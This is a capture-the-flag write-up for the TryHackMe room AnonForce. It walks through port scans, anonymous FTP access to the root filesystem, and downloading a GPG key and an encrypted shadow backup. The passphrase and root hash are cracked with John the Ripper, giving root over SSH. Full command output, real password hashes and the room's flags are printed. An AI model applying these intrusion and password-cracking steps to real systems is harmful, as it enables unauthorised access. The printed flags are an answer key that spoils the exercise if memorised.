# Write Up for Try Hack Me box - [AnonForce](https://tryhackme.com/room/bsidesgtanonforce)

This was an interesting box as someone forgot to remove system dir listing on the FTP.\
Moreover, also left some interesting secrets file that allowed us to escalate as sysadmin on the system.

> Pratyush Prakhar (5#1NC#4N) - 06/16/2023

## RECONNAISSANCE

1. Scan the box with rustscan.
	1. Full port scan --> [nmap file here](rustscan/all.nmap)

	**Results**

	```bash
	$ rustscan --range 1-65535 -a 10.10.217.109 -- -oN rustscan/all.nmap 
	.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
	| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
	| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
	`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
	The Modern Day Port Scanner.
	________________________________________
	: http://discord.skerritt.blog           :
	: https://github.com/RustScan/RustScan :
	--------------------------------------
	Nmap? More like slowmap.🐢

	[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
	[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
	Open 10.10.217.109:21
	Open 10.10.217.109:22
	[~] Starting Script(s)
	[>] Running script "nmap -vvv -p {{port}} {{ip}} -oN nmap/all.nmap" on ip 10.10.217.109
	Depending on the complexity of the script, results may take some time to appear.
	[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 00:25 IST
	Initiating Ping Scan at 00:25
	Scanning 10.10.217.109 [2 ports]
	Completed Ping Scan at 00:25, 0.17s elapsed (1 total hosts)
	Initiating Parallel DNS resolution of 1 host. at 00:25
	Completed Parallel DNS resolution of 1 host. at 00:25, 0.05s elapsed
	DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
	Initiating Connect Scan at 00:25
	Scanning 10.10.217.109 [2 ports]
	Discovered open port 21/tcp on 10.10.217.109
	Discovered open port 22/tcp on 10.10.217.109
	Completed Connect Scan at 00:25, 0.21s elapsed (2 total ports)
	Nmap scan report for 10.10.217.109
	Host is up, received conn-refused (0.18s latency).
	Scanned at 2023-11-04 00:25:01 IST for 0s

	PORT   STATE SERVICE REASON
	21/tcp open  ftp     syn-ack
	22/tcp open  ssh     syn-ack

	Read data files from: /usr/bin/../share/nmap
	Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
	```

	2. Full Service and Scripts scan on the found ports. --> [nmap file here](rustscan/main.nmap)

	**Results**

	```bash
	$ rustscan --ports 21,22 -a 10.10.217.109 -- -sC -sV -oN nmap/main.nmap
	.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
	| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
	| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
	`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
	The Modern Day Port Scanner.
	________________________________________
	: http://discord.skerritt.blog           :
	: https://github.com/RustScan/RustScan :
	--------------------------------------
	😵 https://admin.tryhackme.com

	[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
	[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
	Open 10.10.217.109:21
	Open 10.10.217.109:22
	[~] Starting Script(s)
	[>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV -oN nmap/main.nmap" on ip 10.10.217.109
	Depending on the complexity of the script, results may take some time to appear.
	[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 00:25 IST
	NSE: Loaded 156 scripts for scanning.
	NSE: Script Pre-scanning.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 00:25
	Completed NSE at 00:25, 0.00s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 00:25
	Completed NSE at 00:25, 0.00s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 00:25
	Completed NSE at 00:25, 0.00s elapsed
	Initiating Ping Scan at 00:25
	Scanning 10.10.217.109 [2 ports]
	Completed Ping Scan at 00:25, 0.20s elapsed (1 total hosts)
	Initiating Parallel DNS resolution of 1 host. at 00:25
	Completed Parallel DNS resolution of 1 host. at 00:25, 0.05s elapsed
	DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
	Initiating Connect Scan at 00:25
	Scanning 10.10.217.109 [2 ports]
	Discovered open port 21/tcp on 10.10.217.109
	Discovered open port 22/tcp on 10.10.217.109
	Completed Connect Scan at 00:25, 0.21s elapsed (2 total ports)
	Initiating Service scan at 00:25
	Scanning 2 services on 10.10.217.109
	Completed Service scan at 00:25, 0.41s elapsed (2 services on 1 host)
	NSE: Script scanning 10.10.217.109.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 00:25
	NSE: [ftp-bounce 10.10.217.109:21] PORT response: 500 Illegal PORT command.
	Completed NSE at 00:26, 5.17s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 00:26
	Completed NSE at 00:26, 1.28s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 00:26
	Completed NSE at 00:26, 0.00s elapsed
	Nmap scan report for 10.10.217.109
	Host is up, received conn-refused (0.20s latency).
	Scanned at 2023-11-04 00:25:56 IST for 7s

	PORT   STATE SERVICE REASON  VERSION
	21/tcp open  ftp     syn-ack vsftpd 3.0.3
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
	| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
	| drwxr-xr-x   17 0        0            3700 Nov 03 11:34 dev
	| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
	| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
	| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
	| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
	| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
	| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
	| drwx------    2 0        0           16384 Aug 11  2019 lost+found
	| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
	| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
	| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
	| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
	| dr-xr-xr-x   98 0        0               0 Nov 03 11:34 proc
	| drwx------    3 0        0            4096 Aug 11  2019 root
	| drwxr-xr-x   18 0        0             540 Nov 03 11:34 run
	| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
	| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
	| dr-xr-xr-x   13 0        0               0 Nov 03 11:34 sys
	| drwxrwxrwt    9 0        0            4096 Nov 03 11:34 tmp [NSE: writeable]
	| drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
	| drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
	| lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
	|_lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to ::ffff:10.17.88.193
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 2
	|      vsFTPd 3.0.3 - secure, fast, stable
	|_End of status
	22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDkGQ8G5TDLFJY+zMp5dEj6XUwoH7ojGBjGkOmAf6d9PuIsf4DPFJQmoCA/eiSZpIwfQ14hVhXJHTclmcCd+2OeriuLXq0fEn+aHTo5X82KADkJibmel86qS7ToCzcaROnUkJU17mY3MuyTbfxuqmSvTv/7NI0zRW+cJ+cqwmeSZyhLnOHZ9GT5Y3Lbpvt2w0ktQ128POyaO4GrGA0EERWstIxExpqLaLsqjQPE/hBnIgZXZjd6EL1gn1/CSQnJVdLesIWMcvT5qnm9dZn/ysvysdHHaHylCSKIx5Qu9LtsitssoglpDlhXu5kr2do6ncWMAdTW75asBh+VE+QVX3vV
	|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAq1VuleOFZpJb73D/25H1l0wp9Cs/SGwWIjwtGW0/2/20+xMsac5E8rACtXtLaAuL3Dk/IRSrORuEfU11R0H3A=
	|   256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIiId/YCdJZgD4/DG314U2CpAu8Y13DAx7AQ+JX+3zVc
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

	NSE: Script Post-scanning.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 00:26
	Completed NSE at 00:26, 0.00s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 00:26
	Completed NSE at 00:26, 0.00s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 00:26
	Completed NSE at 00:26, 0.00s elapsed
	Read data files from: /usr/bin/../share/nmap
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 7.72 seconds
	```

2. There are **2 TCP** ports open. 
	1. *Port 21* - FTP - **vsftpd 3.0.3** - *Anonymous Login allowed*
	2. *Port 22* - SSH - **OpenSSH 7.2p2**

3. Let's jump into FTP first as it is the low hanging fruit. Then we will take a stab at SSH.

## FTP

1. We get into the the FTP listing through the anonymous login. We see that we land into a linux `/` directory.

```bash
$ ftp 10.10.217.109
Connected to 10.10.217.109.
220 (vsFTPd 3.0.3)
Name (10.10.217.109:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||23823|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Nov 03 11:34 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   92 0        0               0 Nov 03 11:34 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Nov 03 11:34 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Nov 03 11:34 sys
drwxrwxrwt    9 0        0            4096 Nov 03 11:34 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
```

2. As tester (hacker) of the systems, we first jump at things out of ordinary. Through the earlier scan and by shear Awesome eyesight, I found an odd directory listed as `notread`. On exploring, I found that the directory contained a **Private ASC key** and **Backup GPG file**. Sounds Interesting.

```bash
ftp> cd notread
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||43615|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp> get backup.pgp
local: backup.pgp remote: backup.pgp
229 Entering Extended Passive Mode (|||40507|)
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
100% |**************************************************************************************|   524       14.27 MiB/s    00:00 ETA
226 Transfer complete.
524 bytes received in 00:00 (3.31 KiB/s)
ftp> get private.asc
local: private.asc remote: private.asc
229 Entering Extended Passive Mode (|||43080|)
150 Opening BINARY mode data connection for private.asc (3762 bytes).
100% |**************************************************************************************|  3762       87.50 MiB/s    00:00 ETA
226 Transfer complete.
3762 bytes received in 00:00 (23.69 KiB/s)
```

3. On importing the `private.asc` file, I found that it was protected with a *passphrase*. Hmmmmmm. That is a roadblock. But Fret not, cracking though nuts is part of the job. Let's take help of Awesome J0hn that has features like `gpg2john` and crack it with `rockyou.txt`. Voila, we found the [passphrase](ftp/notread/private_cracked.txt) pretty simple.

```bash
$ gpg --import private.asc              
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: key B92CD1F280AD82C2/B92CD1F280AD82C2: error sending to agent: Operation cancelled
gpg: error reading 'private.asc': Operation cancelled
gpg: import from 'private.asc' failed: Operation cancelled
gpg: Total number processed: 0
gpg:              unchanged: 1
gpg:       secret keys read: 1
                                                                                                                                   
$ gpg2john private.asc                                               

File private.asc
anonforce:$gpg$*17*54*2048*e419ac715ed55197122fd0acc6477832266db83b63a3f0d16b7f5fb3db2b93a6a995013bb1e7aff697e782d505891ee260e957136577*3*254*2*9*16*5d044d82578ecc62baaa15c1bcf1cfdd*65536*d7d11d9bf6d08968:::anonforce <melodias@anonforce.nsa>::private.asc
                                                                                                                                   
$ gpg2john private.asc > privateasc.hash

File private.asc

$ john privateasc.hash --show
anonforce:********:::anonforce <melodias@anonforce.nsa>::private.asc

1 password hash cracked, 0 left
```

4. On entering the passphrase, GPG accepted our key and was able to decrypt the `backup.gpg` file as follows.

```bash
$ gpg --import private.asc                                   
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
                                                                                                                                   
$ gpg --decrypt backup.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::              
```

## SSH - SYS ACCESS 

1. We now have a `shadow` (backed up) file and obtained the `passwd` file through FTP. Let's unshadow both files to get the hash crackable file for john.
```bash
$ unshadow passwd backup_shadow.txt 
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/usr/sbin/nologin
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:*:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:*:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:*:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:*:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:*:104:108::/home/syslog:/bin/false
_apt:*:105:65534::/nonexistent:/bin/false
messagebus:*:106:110::/var/run/dbus:/bin/false
uuidd:*:107:111::/run/uuidd:/bin/false
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:1000:1000:anonforce,,,:/home/melodias:/bin/bash
sshd:*:108:65534::/var/run/sshd:/usr/sbin/nologin
ftp:*:109:117:ftp daemon,,,:/srv/ftp:/bin/false
                                                                                                                                   
$ unshadow passwd backup_shadow.txt > hashes
```

2. Let's reach out to JOHN once more to crack the [unshadowed file](ssh/hashes) to get some creds to get access. And what luck, we cracked the [root](ssh/cracked_hashes.txt) !!!

```bash
$ john hashes --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"
Use the "--format=md5crypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
******           (root)     
1g 0:00:00:02 DONE (2023-11-04 01:04) 0.4444g/s 3072p/s 3072c/s 3072C/s 98765432..better
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                   
┌──(kali㉿kali)-[~/…/In Progress/Easy/Anonforce/ssh]
└─$ john hashes --show                                     
root:******:0:0:root:/root:/bin/bash

1 password hash cracked, 1 left
                                                                                                                                   
┌──(kali㉿kali)-[~/…/In Progress/Easy/Anonforce/ssh]
└─$ john hashes --show > cracked_hashes.txt
```

3. The Box is PAWNed !! Let's SSH into the box to get full C&C.

```bash
$ ssh root@10.10.217.109                          
The authenticity of host '10.10.217.109 (10.10.217.109)' can't be established.
ED25519 key fingerprint is SHA256:+bhLW3R5qYI2SvPQsCWR9ewCoewWWvFfTVFQUAGr+ew.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.217.109' (ED25519) to the list of known hosts.
root@10.10.217.109's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ubuntu:~# whoami
root
root@ubuntu:~# cd /home/
root@ubuntu:/home# cd melodias/
root@ubuntu:/home/melodias# ls
user.txt
root@ubuntu:/home/melodias# cat user.txt 
********************************
root@ubuntu:/home/melodias# cat /root/root.txt 
********************************
```

## EXTRA TREATS

1. Ran a quick linpeas scan as `melodias`. Here is the [file](ssh/linpeas.txt). I leave the rest fun upto you. See you soon.

## FLAGS

1. User Flag - `606083fd33beb1284fc51f411a706af8`

2. Root Flag - `f706456440c7af4187810c31c6cebdce`

**Stay Tuned On**\
[GitHub](https://github.com/pratty010/Boxes)\
[LinkedIn](https://www.linkedin.com/in/pratyush-prakhar/)